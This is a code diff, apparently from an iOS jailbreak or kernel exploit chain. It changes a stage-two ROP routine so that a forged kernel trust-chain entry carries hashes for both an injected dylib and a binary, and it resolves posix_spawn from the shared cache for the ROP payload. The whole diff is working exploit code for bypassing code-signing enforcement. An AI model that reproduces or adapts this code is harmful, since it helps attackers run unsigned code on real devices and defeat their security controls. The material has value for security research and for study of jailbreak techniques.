@@ -949,13 +949,15 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 		uint64_t next;
 		unsigned char uuid[16];
 		unsigned int count;
-		hash_t hash[1];
+		hash_t hash[2];
 	};
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
-	new_entry->count = 1;
-	hash_t my_dylib_hash = {0xe3,0x12,0xb6,0x03,0x41,0x94,0x52,0x17,0xeb,0x61,0x41,0xea,0xf0,0x42,0xfc,0x33,0xd3,0x85,0xd7,0xb4};
+	new_entry->count = 2;
+	hash_t my_dylib_hash = {0x6e,0xa5,0x78,0x0d,0x0d,0x1b,0x49,0xad,0x99,0x03,0x82,0x08,0xa6,0x8c,0xc9,0x7c,0x2e,0xa4,0xa9,0x92};
+	hash_t my_binary_hash = {0xd3,0x17,0x27,0x38,0xc1,0x33,0x1d,0x75,0xc5,0xbc,0x41,0xb7,0xcd,0x9b,0x4b,0xa7,0xfc,0x75,0xcb,0x73};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
+	memcpy(&new_entry->hash[1],my_binary_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
 
 	char * dylib_str = malloc(100);
@@ -1596,6 +1598,7 @@ _STRUCT_ARM_THREAD_STATE64
 			kern_return_t (*mach_port_insert_right) (ipc_space_t task,mach_port_name_t name,mach_port_poly_t right,mach_msg_type_name_t right_type);
 			kern_return_t (*mach_ports_register) (task_t target_task,mach_port_array_t init_port_set,uint64_t /*???target_task*/ init_port_array_count);
 			mach_msg_return_t (*mach_msg) (mach_msg_header_t * msg,mach_msg_option_t option,mach_msg_size_t send_size,mach_msg_size_t receive_limit,mach_port_t receive_name,mach_msg_timeout_t timeout,mach_port_t notify);
+			int (*posix_spawn) (uint64_t pid, const char * path, void *, void *, char * const argv[], char * const envp[]);
 		} userland_funcs;
 	} offsets_t;
 	offsets_t * lib_offsets = malloc(sizeof(offsets_t));
@@ -1638,6 +1641,7 @@ _STRUCT_ARM_THREAD_STATE64
 	lib_offsets->userland_funcs.mach_port_insert_right = get_addr_from_name(offsets,"mach_port_insert_right") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.mach_ports_register = get_addr_from_name(offsets,"mach_ports_register") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.mach_msg = get_addr_from_name(offsets,"mach_msg") - 0x180000000 + offsets->new_cache_addr;
+	lib_offsets->userland_funcs.posix_spawn = get_addr_from_name(offsets,"posix_spawn") - 0x180000000 + offsets->new_cache_addr;
 	DEFINE_ROP_VAR("lib_offsets",sizeof(offsets_t),lib_offsets);
 	// jump void where_it_all_starts(kport_t * fakeport,void * fake_client,uint64_t ip_kobject_client_port_addr,uint64_t our_task_addr,uint64_t kslide,uint64_t the_one,offsets_t * offsets)
 	ROP_VAR_ARG_HOW_MANY(7);
